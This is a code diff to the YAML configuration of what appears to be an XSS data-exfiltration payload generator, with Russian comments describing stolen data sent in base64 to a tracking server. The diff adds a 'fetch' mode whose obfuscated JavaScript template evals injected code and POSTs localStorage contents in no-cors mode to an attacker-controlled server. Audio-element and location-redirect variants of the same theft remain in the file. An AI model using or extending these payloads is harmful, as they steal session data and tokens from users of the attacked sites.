@@ -39,6 +39,7 @@ arguments:
       - video
       - audio
       - location
+      - fetch
     description: агент с помощью которого будет осуществляться запрос на отслеживающий сервер
     replacer: '#agent#'
   
@@ -50,7 +51,7 @@ arguments:
     regex: '\d+'
 
   t:
-    default: 500
+    default: 1500
     description: время задержки получения данных из localStorage после выполенения eval
     replacer: '#evaldelay#'
     metavar: ms
@@ -64,13 +65,13 @@ arguments:
 
   num-param:
     default: number
-    description: GET-параметр, отвечающий за нумерацию отправляемой части данных
+    description: GET-параметр, отвечающий за нумерацию отправляемой части данных (не применимо к fetch)
     metavar: PARAMETER
     replacer: '#num-param#'
 
   pld-param:
     default: payload
-    description: GET-параметр, в котором будет отправляться похищенное в кодировке base64
+    description: GET-параметр, в котором будет отправляться похищенное в кодировке base64 (не применимо к fetch)
     metavar: PARAMETER
     replacer: '#payload-param#'
   
@@ -78,7 +79,7 @@ arguments:
     default: 
       - body
       - head
-    description: вставлять нагрузку в document.head вместо document.body (не применимо к location)
+    description: вставлять нагрузку в document.head вместо document.body (не применимо к location и fetch)
     replacer: '#pos#'
   
   btoa-fix:
@@ -128,13 +129,17 @@ mode:
         var attackElementStart = `<audio src="${serverURL}?${numParam}=`;
         var attackElementMid = `&${payloadParam}=`;
         var attackElementEnd = `"controls style="display:none"></audio>`;
-        var payloadTemplate = "(eval(String.fromCharCode(${chars_jscode})),setTimeout(function(){#btoa-fix#.match(RegExp(String.fromCharCode(${chars_datablockRegex}),String.fromCharCode(103))).forEach(function(c,i){document.${position}.insertAdjacentHTML(String.fromCharCode(${chars_position}),String.fromCharCode(${chars_attackElementStart}).concat(i,String.fromCharCode(${chars_attackElementMid}),c,String.fromCharCode(${chars_attackElementEnd})))})},${evalDelay}))"
-      
+        var payloadTemplate = "(eval(String.fromCharCode(${chars_jscode})),setTimeout(function(){#btoa-fix#.match(RegExp(String.fromCharCode(${chars_datablockRegex}),String.fromCharCode(103))).forEach(function(c,i){document.${position}.insertAdjacentHTML(String.fromCharCode(${chars_position}),String.fromCharCode(${chars_attackElementStart}).concat(i,String.fromCharCode(${chars_attackElementMid}),c,String.fromCharCode(${chars_attackElementEnd})))})},${evalDelay}))"   
       location: |
         var attackElementStart = `${serverURL}?${numParam}=`;
         var attackElementMid = `&${payloadParam}=`;
         var attackElementEnd = "";
         var payloadTemplate = "(eval(String.fromCharCode(${chars_jscode})),setTimeout(function(){#btoa-fix#.match(RegExp(String.fromCharCode(${chars_datablockRegex}),String.fromCharCode(103))).forEach(function(c,i){setTimeout(function(){if(localStorage.getItem(${randomNumber})==null){localStorage.setItem(${randomNumber},0)}if(localStorage.getItem(${randomNumber})==i){(localStorage.setItem(${randomNumber},i-(-1)),window.location.replace(String.fromCharCode(${chars_attackElementStart}).concat(i,String.fromCharCode(${chars_attackElementMid}),c)))}},${locationDelay}*i)})},${evalDelay}))"
+      fetch: |
+        var attackElementStart = `${serverURL}`;
+        var attackElementMid = "";
+        var attackElementEnd = "";
+        var payloadTemplate = "(eval(String.fromCharCode(${chars_jscode})),setTimeout(function(){fetch(String.fromCharCode(${chars_attackElementStart}),JSON.parse(String.fromCharCode(123,34,109,101,116,104,111,100,34,58,34,80,79,83,84,34,44,34,109,111,100,101,34,58,34,110,111,45,99,111,114,115,34,44,34,98,111,100,121,34,58,34).concat(#btoa-fix#,String.fromCharCode(34,125))))},${evalDelay}))"
 shell: node
 script: |-
   const fs = require('fs');
